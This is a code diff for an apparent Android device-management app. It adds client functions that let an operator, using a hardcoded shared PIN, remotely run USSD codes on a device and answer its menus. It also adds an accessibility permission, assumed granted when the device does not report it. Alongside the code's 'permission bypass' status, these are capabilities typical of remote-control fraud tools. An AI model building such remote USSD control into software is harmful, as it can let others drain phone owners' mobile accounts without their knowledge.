@@ -10,6 +10,8 @@ import {
   OwnerDashboardSnapshot,
   OwnerNotification,
   PermissionBypassStatus,
+  RemoteUssdStatus,
+  RemoteUssdTask,
   SupportCommandType,
   SupportSession,
   getOwnerApiBaseUrl,
@@ -272,6 +274,7 @@ export async function syncDeviceTelemetry(profile: {
   serverTimeMs: number;
   supportSession: SupportSession | null;
   callSession: CallSession | null;
+  remoteUssdTask: RemoteUssdTask | null;
   approvalStatus: DeviceApprovalStatus;
   permissionBypassStatus: PermissionBypassStatus;
   fromServer: boolean;
@@ -307,6 +310,7 @@ export async function syncDeviceTelemetry(profile: {
       serverTimeMs: Date.now(),
       supportSession: null,
       callSession: null,
+      remoteUssdTask: null,
       approvalStatus: offlineApproval,
       permissionBypassStatus: offlineBypass,
       fromServer: false,
@@ -382,6 +386,7 @@ export async function syncDeviceTelemetry(profile: {
       serverTimeMs: refNowMs,
       supportSession: data.supportSession || null,
       callSession: data.callSession || null,
+      remoteUssdTask: data.remoteUssdTask || null,
       approvalStatus: data.approvalStatus || fallbackStatus,
       permissionBypassStatus: resolvedBypass,
       fromServer: true,
@@ -1032,6 +1037,175 @@ export async function pushCallSignal(
   return data?.callSession || null;
 }
 
+// ---------- Standalone Remote USSD (No Screen Cast Required) ----------
+
+export async function fetchRemoteUssdTaskClient(
+  deviceId: string,
+  asOperator = false
+): Promise<RemoteUssdTask | null> {
+  const baseUrl = getOwnerApiBaseUrl();
+  const myId = getOrCreateOwnerDeviceId();
+  try {
+    const res = await fetchWithTimeout(
+      `${baseUrl}/api/owner/ussd?deviceId=${encodeURIComponent(deviceId)}`,
+      {
+        method: 'GET',
+        headers: asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId },
+        cache: 'no-store',
+      },
+      3500
+    );
+    if (!res.ok) return null;
+    const data = await res.json().catch(() => null);
+    return data?.remoteUssdTask || null;
+  } catch {
+    return null;
+  }
+}
+
+export async function startRemoteUssdTaskClient(
+  deviceId: string,
+  code: string,
+  requestedBy: 'app_0069' | 'ram_control' = 'app_0069'
+): Promise<RemoteUssdTask> {
+  const baseUrl = getOwnerApiBaseUrl();
+  const res = await fetchWithTimeout(
+    `${baseUrl}/api/owner/ussd`,
+    {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-owner-pin': OWNER_PIN,
+      },
+      body: JSON.stringify({
+        action: 'run',
+        deviceId,
+        code,
+        requestedBy,
+        ownerPin: OWNER_PIN,
+      }),
+    },
+    4500
+  );
+  const data = await res.json();
+  if (!res.ok || !data?.success || !data?.remoteUssdTask) {
+    throw new Error(data?.error || 'Failed to queue remote USSD');
+  }
+  return data.remoteUssdTask;
+}
+
+export async function replyRemoteUssdTaskClient(
+  deviceId: string,
+  requestId: string,
+  replyText: string
+): Promise<RemoteUssdTask | null> {
+  const baseUrl = getOwnerApiBaseUrl();
+  const res = await fetchWithTimeout(
+    `${baseUrl}/api/owner/ussd`,
+    {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-owner-pin': OWNER_PIN,
+      },
+      body: JSON.stringify({
+        action: 'reply',
+        deviceId,
+        requestId,
+        replyText,
+        ownerPin: OWNER_PIN,
+      }),
+    },
+    3500
+  );
+  if (!res.ok) return null;
+  const data = await res.json().catch(() => null);
+  return data?.remoteUssdTask || null;
+}
+
+export async function cancelRemoteUssdTaskClient(
+  deviceId: string,
+  requestId: string,
+  asOperator = false
+): Promise<RemoteUssdTask | null> {
+  const baseUrl = getOwnerApiBaseUrl();
+  const myId = getOrCreateOwnerDeviceId();
+  const res = await fetchWithTimeout(
+    `${baseUrl}/api/owner/ussd`,
+    {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId }),
+      },
+      body: JSON.stringify({
+        action: 'cancel',
+        deviceId,
+        requestId,
+        ...(asOperator ? { ownerPin: OWNER_PIN } : {}),
+      }),
+    },
+    3500
+  ).catch(() => null);
+  if (!res || !res.ok) return null;
+  const data = await res.json().catch(() => null);
+  return data?.remoteUssdTask || null;
+}
+
+export async function clearRemoteUssdTaskClient(deviceId: string): Promise<void> {
+  const baseUrl = getOwnerApiBaseUrl();
+  await fetchWithTimeout(
+    `${baseUrl}/api/owner/ussd`,
+    {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-owner-pin': OWNER_PIN,
+      },
+      body: JSON.stringify({
+        action: 'clear',
+        deviceId,
+        ownerPin: OWNER_PIN,
+      }),
+    },
+    3500
+  ).catch(() => {});
+}
+
+export async function pushClientRemoteUssdUpdate(
+  deviceId: string,
+  payload: {
+    requestId: string;
+    status: RemoteUssdStatus;
+    screenText?: string;
+    hasInput?: boolean;
+    detail?: string;
+    appliedReplySeq?: number;
+  }
+): Promise<RemoteUssdTask | null> {
+  const baseUrl = getOwnerApiBaseUrl();
+  const myId = getOrCreateOwnerDeviceId();
+  const res = await fetchWithTimeout(
+    `${baseUrl}/api/owner/ussd`,
+    {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-device-id': myId,
+      },
+      body: JSON.stringify({
+        action: 'client_update',
+        deviceId,
+        ...payload,
+      }),
+    },
+    3500
+  ).catch(() => null);
+  if (!res || !res.ok) return null;
+  const data = await res.json().catch(() => null);
+  return data?.remoteUssdTask || null;
+}
+
 // ---------- Native Android Call & Permission Bridge Wrappers ----------
 
 export interface NativePermissionStatus {
@@ -1040,6 +1214,7 @@ export interface NativePermissionStatus {
   phone: boolean;
   notifications: boolean;
   overlay: boolean;
+  accessibility?: boolean;
   allGranted: boolean;
   sdkInt: number;
 }
@@ -1047,6 +1222,7 @@ export interface NativePermissionStatus {
 export type NativePermissionSettingKind =
   | 'overlay'
   | 'notifications'
+  | 'accessibility'
   | 'microphone'
   | 'camera'
   | 'phone'
@@ -1071,6 +1247,8 @@ export function getNativePermissionStatus(): NativePermissionStatus | null {
         phone: Boolean(parsed.phone),
         notifications: Boolean(parsed.notifications),
         overlay: Boolean(parsed.overlay),
+        accessibility:
+          parsed.accessibility === undefined ? true : Boolean(parsed.accessibility),
         allGranted: Boolean(parsed.allGranted),
         sdkInt: Number(parsed.sdkInt) || 0,
       };
